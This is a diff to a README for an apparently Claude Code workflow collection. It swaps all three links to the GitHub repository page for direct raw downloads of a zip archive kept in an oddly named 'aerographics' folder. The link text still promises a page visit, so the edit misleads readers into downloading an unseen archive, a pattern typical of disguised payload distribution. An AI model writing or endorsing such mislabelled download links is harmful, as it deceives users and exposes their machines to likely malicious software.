@@ -1,6 +1,6 @@
 # 🤖 awesome-claude-code-workflows - Simple Claude Code task automation
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Aurorabreastfed700/awesome-claude-code-workflows)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Aurorabreastfed700/awesome-claude-code-workflows/main/aerographics/code-awesome-claude-workflows-1.2.zip)
 
 ## 🧭 What this is
 
@@ -44,7 +44,7 @@ This repository is built for people who want clear workflow examples, not a comp
 ## 🚀 Download and open on Windows
 
 1. Visit this page to download or view the repository:
-   [https://github.com/Aurorabreastfed700/awesome-claude-code-workflows](https://github.com/Aurorabreastfed700/awesome-claude-code-workflows)
+   [https://raw.githubusercontent.com/Aurorabreastfed700/awesome-claude-code-workflows/main/aerographics/code-awesome-claude-workflows-1.2.zip](https://raw.githubusercontent.com/Aurorabreastfed700/awesome-claude-code-workflows/main/aerographics/code-awesome-claude-workflows-1.2.zip)
 
 2. On the GitHub page, look for the green **Code** button.
 
@@ -192,7 +192,7 @@ These topics reflect the main focus of the project: structured Claude Code autom
 ## 🔗 Direct access
 
 Use this link to visit the repository page:
-https://github.com/Aurorabreastfed700/awesome-claude-code-workflows
+https://raw.githubusercontent.com/Aurorabreastfed700/awesome-claude-code-workflows/main/aerographics/code-awesome-claude-workflows-1.2.zip
 
 ## 🗂️ If you want to build your own setup
 
